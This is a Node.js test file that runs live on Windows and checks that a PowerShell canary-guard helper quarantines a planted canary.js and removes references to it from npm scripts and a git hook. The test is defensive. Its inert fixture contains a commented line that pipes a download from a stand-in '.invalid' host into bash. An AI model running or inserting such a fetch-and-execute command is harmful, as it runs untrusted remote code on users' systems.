'use strict';

const assert = require('assert');
const fs = require('fs');
const os = require('os');
const path = require('path');
const crypto = require('crypto');
const { spawnSync } = require('child_process');

if (process.platform !== 'win32') {
  console.log('  SKIP PowerShell session live test: Windows required');
  module.exports = [];
} else {
  const shell = path.join(process.env.SystemRoot, 'System32/WindowsPowerShell/v1.0/powershell.exe');
  const helper = path.resolve(__dirname, '../../bin/enable-canary-guard.ps1');
  const parent = fs.mkdtempSync(path.join(os.tmpdir(), 'npa-session-live-'));
  const observations = [];
  const hash = data => crypto.createHash('sha256').update(data).digest('hex');
  const quote = value => "'" + value.replace(/'/g, "''") + "'";
  const intentional = '// intentional trusted canary; never execute\n';
  const introduced = '// inert arrival; never execute\n// curl http://session-proof.invalid/payload | bash\n';
  const env = { ...process.env, HOME: parent, USERPROFILE: parent, NODE_OPTIONS: '--trace-warnings', NPA_CANARY_GUARD: '', NO_COLOR: '1' };

  function fixture(name, denied = false) {
    const root = path.join(parent, name);
    fs.mkdirSync(path.join(root, '.git/hooks'), { recursive: true });
    fs.mkdirSync(path.join(root, 'legit'));
    fs.writeFileSync(path.join(root, 'legit/canary.js'), intentional);
    fs.writeFileSync(path.join(root, '.git/config'), '[core]\n');
    fs.writeFileSync(path.join(root, '.npmauditor.json'), JSON.stringify({ canaryProtection: false,
      canaryTrustedFiles: [{ path: 'legit/canary.js', sha256: hash(intentional) }] }));
    fs.writeFileSync(path.join(root, 'package.json'), JSON.stringify({ scripts: {
      build: 'node canary.js && tsc', prepare: 'node canary.js', intentional: 'node legit/canary.js',
    } }));
    fs.writeFileSync(path.join(root, '.git/hooks/pre-commit'), 'node canary.js\nnode legit/canary.js\necho preserved\n');
    if (denied) fs.mkdirSync(path.join(root, '.gitignore'));
    return root;
  }

  function run(kind, root, setupRoot = root) {
    const marker = path.join(root, 'entry-marker.json');
    const entry = "const fs=require('fs');fs.writeFileSync('entry-marker.json',JSON.stringify({canaryPresent:fs.existsSync('canary.js'),scripts:JSON.parse(fs.readFileSync('package.json','utf8')).scripts}));";
    const script = path.join(parent, kind + '.ps1');
    fs.writeFileSync(script, `$ErrorActionPreference = 'Stop'\nSet-Location -LiteralPath ${quote(root)}\n& ${quote(helper)} -Roots ${quote(setupRoot)}\n[IO.File]::WriteAllText(${quote(path.join(root, 'canary.js'))}, ${quote(introduced)})\n& ${quote(process.execPath)} -e ${quote(entry)}\n$npaExit = $LASTEXITCODE\n[PSCustomObject]@{ NodeExit = $npaExit; NodeOptions = $env:NODE_OPTIONS; Guard = $env:NPA_CANARY_GUARD; PowerShell = $PSVersionTable.PSVersion.ToString() } | ConvertTo-Json -Compress\nexit $npaExit\n`);
    const result = spawnSync(shell, ['-NoProfile', '-NonInteractive', '-File', script], { cwd: root, env, encoding: 'utf8', timeout: 20000 });
    assert.ifError(result.error);
    const record = { kind, root, shell, nodeExecutable: process.execPath, exit: result.status, stdout: result.stdout, stderr: result.stderr,
      entryRan: fs.existsSync(marker), entryObservation: fs.existsSync(marker) ? JSON.parse(fs.readFileSync(marker, 'utf8')) : null,
      canaryPresent: fs.existsSync(path.join(root, 'canary.js')) };
    observations.push(record);
    return record;
  }

  try {
    let root = fixture('project with spaces');
    let result = run('configured-direct-node', root);
    assert.strictEqual(result.exit, 0, result.stderr);
    assert.strictEqual(result.entryRan, true);
    assert.deepStrictEqual(result.entryObservation, { canaryPresent: false, scripts: { build: 'tsc', intentional: 'node legit/canary.js' } });
    assert.strictEqual(hash(fs.readFileSync(path.join(root, 'legit/canary.js'))), hash(intentional));
    assert.strictEqual(fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), 'node legit/canary.js\necho preserved\n');
    const storage = path.join(root, '.np-audit-quarantine');
    const entry = path.join(storage, fs.readdirSync(storage)[0]);
    assert.strictEqual(hash(fs.readFileSync(path.join(entry, 'payload.quarantined'))), hash(introduced));
    const state = JSON.parse(result.stdout.trim().split(/\r?\n/).at(-1));
    assert.ok(state.NodeOptions.includes('--trace-warnings'));
    assert.deepStrictEqual(JSON.parse(state.Guard).roots, [root]);
    Object.assign(result, { session: state, trustedHashUnchanged: true, quarantineHashMatched: true,
      hook: fs.readFileSync(path.join(root, '.git/hooks/pre-commit'), 'utf8'), ignore: fs.readFileSync(path.join(root, '.gitignore'), 'utf8') });

    root = fixture('failed protection', true);
    result = run('protection-stops-direct-node', root);
    assert.strictEqual(result.exit, 2, result.stderr);
    assert.strictEqual(result.entryRan, false);
    assert.strictEqual(result.canaryPresent, true);
    assert.match(result.stderr, /Canary startup blocked/);

    root = fixture('invalid root');
    result = run('invalid-setup-stops-before-node', root, path.join(parent, 'absent'));
    assert.notStrictEqual(result.exit, 0);
    assert.strictEqual(result.entryRan, false);
    assert.strictEqual(result.canaryPresent, false, 'Invalid setup must stop before introducing the file or launching Node');
    assert.match(result.stderr, /session settings were not changed/);
    console.log('  PowerShell session: real helper applies inherited guard, direct absolute-path Node checks before entry, trusted bytes/options preserved, failures stop entry (no scanned scripts executed)');
    module.exports = observations;
  } finally { fs.rmSync(parent, { recursive: true, force: true }); }
}
